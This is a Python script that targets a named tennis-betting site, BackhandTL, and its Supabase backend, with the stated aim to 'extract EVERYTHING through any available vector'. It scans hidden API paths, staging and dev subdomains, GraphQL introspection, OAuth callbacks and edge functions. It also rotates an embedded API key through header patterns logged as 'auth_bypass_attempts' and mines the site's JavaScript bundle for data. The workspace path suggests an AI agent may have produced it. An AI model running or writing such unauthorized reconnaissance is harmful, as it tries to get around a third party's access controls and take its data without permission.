#!/usr/bin/env python3
"""
730's Locks - BackhandTL Complete Data Extraction
Operation: Extract EVERYTHING from BackhandTL through any available vector
"""

import requests
import json
import time
from datetime import datetime
import re
from urllib.parse import urljoin, urlparse

class BackhandTLCompleteExtractor:
    def __init__(self):
        self.base_url = "https://backhandtl.com"
        self.supabase_url = "https://suoaznisiowoolxilaju.supabase.co"
        self.anon_key = "eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InN1b2F6bmlzaW93b29seGlsYWp1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYzNzAwNjIsImV4cCI6MjA4MTczMDA2Mn0"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site'
        })
        
        self.results = {
            'timestamp': datetime.now().isoformat(),
            'public_data': {},
            'api_endpoints': {},
            'auth_bypass_attempts': {},
            'alternative_access': {},
            'scraped_data': {},
            'discovered_endpoints': []
        }
    
    def method_1_public_endpoints(self):
        """Method 1: Find public/unauthenticated endpoints"""
        print("🔍 METHOD 1: Scanning for public endpoints...")
        
        public_paths = [
            '/api/public',
            '/api/v1/public',
            '/public',
            '/health',
            '/status',
            '/.well-known',
            '/manifest.json',
            '/robots.txt',
            '/sitemap.xml',
            '/favicon.ico',
            '/api/health',
            '/api/status',
            '/api/ping',
            '/api/version'
        ]
        
        for path in public_paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    print(f"✅ Found public endpoint: {path}")
                    self.results['api_endpoints'][path] = {
                        'status': response.status_code,
                        'content_type': response.headers.get('content-type', ''),
                        'data': response.text[:1000] if response.text else None
                    }
            except Exception as e:
                pass
    
    def method_2_supabase_public_access(self):
        """Method 2: Try different Supabase access patterns"""
        print("🔍 METHOD 2: Testing Supabase public access patterns...")
        
        # Try different auth patterns
        auth_patterns = [
            {},  # No auth
            {'Authorization': f'Bearer {self.anon_key}'},
            {'apikey': self.anon_key},
            {'Authorization': f'Bearer {self.anon_key}', 'apikey': self.anon_key},
            {'X-API-Key': self.anon_key},
            {'Authorization': f'Basic {self.anon_key}'}
        ]
        
        test_endpoints = [
            '/rest/v1/',
            '/rest/v1/rpc/',
            '/auth/v1/',
            '/storage/v1/',
            '/functions/v1/',
            '/rest/v1/health',
            '/rest/v1/players?select=count',
            '/rest/v1/market_odds?select=count',
            '/rest/v1/players?select=*&limit=1',
            '/rest/v1/public_players',
            '/rest/v1/leaderboard',
            '/rest/v1/stats'
        ]
        
        for endpoint in test_endpoints:
            for i, auth in enumerate(auth_patterns):
                try:
                    url = f"{self.supabase_url}{endpoint}"
                    headers = {**self.session.headers, **auth}
                    response = requests.get(url, headers=headers, timeout=10)
                    
                    if response.status_code not in [401, 403, 404]:
                        print(f"🎯 Accessible endpoint found: {endpoint} (auth pattern {i})")
                        self.results['auth_bypass_attempts'][f"{endpoint}_pattern_{i}"] = {
                            'status_code': response.status_code,
                            'auth_pattern': auth,
                            'response': response.text[:1000] if response.text else None
                        }
                        
                except Exception as e:
                    pass
    
    def method_3_graphql_discovery(self):
        """Method 3: Check for GraphQL endpoints"""
        print("🔍 METHOD 3: Searching for GraphQL endpoints...")
        
        graphql_paths = [
            '/graphql',
            '/api/graphql',
            '/v1/graphql',
            '/graphql/v1',
            '/query',
            '/api/query',
            '/gql'
        ]
        
        for path in graphql_paths:
            try:
                # Try both main site and Supabase
                for base in [self.base_url, self.supabase_url]:
                    url = f"{base}{path}"
                    
                    # Try GraphQL introspection query
                    introspection_query = {
                        "query": "query IntrospectionQuery { __schema { queryType { name } } }"
                    }
                    
                    response = self.session.post(url, json=introspection_query, timeout=10)
                    if response.status_code == 200 or 'graphql' in response.text.lower():
                        print(f"🎯 GraphQL endpoint found: {url}")
                        self.results['discovered_endpoints'].append({
                            'type': 'graphql',
                            'url': url,
                            'response': response.text[:500]
                        })
                        
            except Exception as e:
                pass
    
    def method_4_alternative_domains(self):
        """Method 4: Check for alternative domains/subdomains"""
        print("🔍 METHOD 4: Checking alternative domains...")
        
        alternative_domains = [
            'api.backhandtl.com',
            'data.backhandtl.com',
            'public.backhandtl.com',
            'cdn.backhandtl.com',
            'assets.backhandtl.com',
            'feeds.backhandtl.com',
            'export.backhandtl.com',
            'dev.backhandtl.com',
            'staging.backhandtl.com',
            'beta.backhandtl.com'
        ]
        
        for domain in alternative_domains:
            try:
                response = self.session.get(f"https://{domain}", timeout=10)
                if response.status_code == 200:
                    print(f"🎯 Alternative domain found: {domain}")
                    self.results['alternative_access'][domain] = {
                        'status': response.status_code,
                        'content': response.text[:500]
                    }
            except Exception as e:
                pass
    
    def method_5_data_feeds_rss(self):
        """Method 5: Look for data feeds, RSS, XML exports"""
        print("🔍 METHOD 5: Searching for data feeds...")
        
        feed_paths = [
            '/feed',
            '/rss',
            '/xml',
            '/api/feed',
            '/data/export',
            '/export',
            '/download',
            '/csv',
            '/json',
            '/api/export',
            '/public/data',
            '/data.json',
            '/players.json',
            '/matches.json',
            '/odds.json'
        ]
        
        for path in feed_paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    print(f"✅ Data feed found: {path}")
                    self.results['public_data'][path] = {
                        'content_type': response.headers.get('content-type', ''),
                        'size': len(response.content),
                        'data': response.text[:2000] if response.text else None
                    }
            except Exception as e:
                pass
    
    def method_6_supabase_realtime(self):
        """Method 6: Try Supabase realtime/websocket endpoints"""
        print("🔍 METHOD 6: Testing Supabase realtime access...")
        
        realtime_endpoints = [
            '/realtime/v1/websocket',
            '/realtime/v1/',
            '/socket/'
        ]
        
        for endpoint in realtime_endpoints:
            try:
                url = f"{self.supabase_url}{endpoint}"
                response = self.session.get(url, timeout=10)
                if response.status_code not in [404, 403]:
                    print(f"🎯 Realtime endpoint accessible: {endpoint}")
                    self.results['discovered_endpoints'].append({
                        'type': 'realtime',
                        'url': url,
                        'status': response.status_code
                    })
            except Exception as e:
                pass
    
    def method_7_oauth_social_endpoints(self):
        """Method 7: Check for OAuth/social login data leaks"""
        print("🔍 METHOD 7: Checking OAuth/social endpoints...")
        
        oauth_paths = [
            '/auth/callback',
            '/oauth/callback',
            '/login/callback',
            '/api/auth',
            '/auth/providers',
            '/.auth/me',
            '/api/auth/providers'
        ]
        
        for path in oauth_paths:
            try:
                url = f"{self.base_url}{path}"
                response = self.session.get(url, timeout=10)
                if response.status_code == 200:
                    self.results['discovered_endpoints'].append({
                        'type': 'oauth',
                        'url': url,
                        'response': response.text[:500]
                    })
            except Exception as e:
                pass
    
    def method_8_javascript_data_extraction(self):
        """Method 8: Extract hardcoded data from JavaScript files"""
        print("🔍 METHOD 8: Mining JavaScript for hardcoded data...")
        
        try:
            # Get the main JS bundle
            js_response = self.session.get(f"{self.base_url}/assets/index-B50aJzaH.js", timeout=20)
            if js_response.status_code == 200:
                js_content = js_response.text
                
                # Look for hardcoded data patterns
                data_patterns = [
                    r'players\s*[:=]\s*(\[.*?\])',
                    r'matches\s*[:=]\s*(\[.*?\])',
                    r'odds\s*[:=]\s*(\[.*?\])',
                    r'mockData\s*[:=]\s*({.*?})',
                    r'sampleData\s*[:=]\s*({.*?})',
                    r'defaultData\s*[:=]\s*({.*?})',
                    r'testData\s*[:=]\s*({.*?})',
                    r'"name"\s*:\s*"([^"]+)"',  # Player names
                    r'"odds"\s*:\s*([0-9.]+)',  # Odds values
                    r'"probability"\s*:\s*([0-9.]+)'  # Probabilities
                ]
                
                extracted_data = {}
                for pattern in data_patterns:
                    matches = re.findall(pattern, js_content, re.IGNORECASE | re.DOTALL)
                    if matches:
                        extracted_data[pattern] = matches[:10]  # Limit results
                
                if extracted_data:
                    print(f"🎯 Found hardcoded data in JavaScript!")
                    self.results['scraped_data']['javascript'] = extracted_data
                    
        except Exception as e:
            print(f"❌ JS extraction error: {e}")
    
    def method_9_cache_cdn_check(self):
        """Method 9: Check for cached/CDN data"""
        print("🔍 METHOD 9: Checking CDN/cache endpoints...")
        
        cdn_patterns = [
            '/_next/static/chunks/',
            '/static/',
            '/assets/',
            '/cache/',
            '/cdn/',
            '/_vercel/insights/'
        ]
        
        for pattern in cdn_patterns:
            try:
                # Look for data files in static assets
                test_files = [
                    f'{pattern}data.json',
                    f'{pattern}players.json',
                    f'{pattern}config.json',
                    f'{pattern}manifest.json'
                ]
                
                for test_file in test_files:
                    url = f"{self.base_url}{test_file}"
                    response = self.session.get(url, timeout=10)
                    if response.status_code == 200:
                        print(f"✅ Found cached data: {test_file}")
                        self.results['public_data'][test_file] = response.text[:1000]
                        
            except Exception as e:
                pass
    
    def method_10_supabase_functions(self):
        """Method 10: Test Supabase Edge Functions"""
        print("🔍 METHOD 10: Testing Supabase Edge Functions...")
        
        function_names = [
            'get-players',
            'public-data',
            'leaderboard',
            'stats',
            'health',
            'ping'
        ]
        
        for func_name in function_names:
            try:
                url = f"{self.supabase_url}/functions/v1/{func_name}"
                response = self.session.post(url, json={}, timeout=10)
                if response.status_code not in [404, 403, 401]:
                    print(f"🎯 Accessible function: {func_name}")
                    self.results['discovered_endpoints'].append({
                        'type': 'edge_function',
                        'name': func_name,
                        'url': url,
                        'status': response.status_code,
                        'response': response.text[:500]
                    })
            except Exception as e:
                pass
    
    def execute_all_methods(self):
        """Execute all data extraction methods"""
        print("=" * 80)
        print("🚀 EXECUTING COMPLETE DATA EXTRACTION OPERATION")
        print("=" * 80)
        
        methods = [
            self.method_1_public_endpoints,
            self.method_2_supabase_public_access,
            self.method_3_graphql_discovery,
            self.method_4_alternative_domains,
            self.method_5_data_feeds_rss,
            self.method_6_supabase_realtime,
            self.method_7_oauth_social_endpoints,
            self.method_8_javascript_data_extraction,
            self.method_9_cache_cdn_check,
            self.method_10_supabase_functions
        ]
        
        for method in methods:
            try:
                method()
                time.sleep(0.5)  # Be respectful
            except Exception as e:
                print(f"❌ Method {method.__name__} failed: {e}")
                continue
        
        return self.results
    
    def save_results(self, filename):
        """Save all results to file"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        print(f"💾 Results saved to: {filename}")
    
    def display_summary(self):
        """Display extraction summary"""
        print("\n" + "=" * 80)
        print("📊 EXTRACTION RESULTS SUMMARY")
        print("=" * 80)
        
        total_found = 0
        for category, data in self.results.items():
            if isinstance(data, dict) and data:
                count = len(data)
                total_found += count
                print(f"🎯 {category.replace('_', ' ').title()}: {count} items")
                
                # Show first few results
                for key in list(data.keys())[:3]:
                    print(f"   • {key}")
                    
                if len(data) > 3:
                    print(f"   • ... and {len(data) - 3} more")
        
        if total_found == 0:
            print("❌ No accessible data found through automated methods")
            print("🎯 Recommendation: Manual browser session or account signup required")
        else:
            print(f"\n🏆 TOTAL DATA SOURCES DISCOVERED: {total_found}")

def main():
    extractor = BackhandTLCompleteExtractor()
    
    try:
        results = extractor.execute_all_methods()
        extractor.display_summary()
        
        # Save detailed results
        output_file = '/home/icsuccess98/.openclaw/workspace/content/research/backhandtl_complete_extraction.json'
        extractor.save_results(output_file)
        
        print(f"\n📁 Detailed results: {output_file}")
        
        return results
        
    except Exception as e:
        print(f"❌ Extraction failed: {e}")
        return None

if __name__ == "__main__":
    main()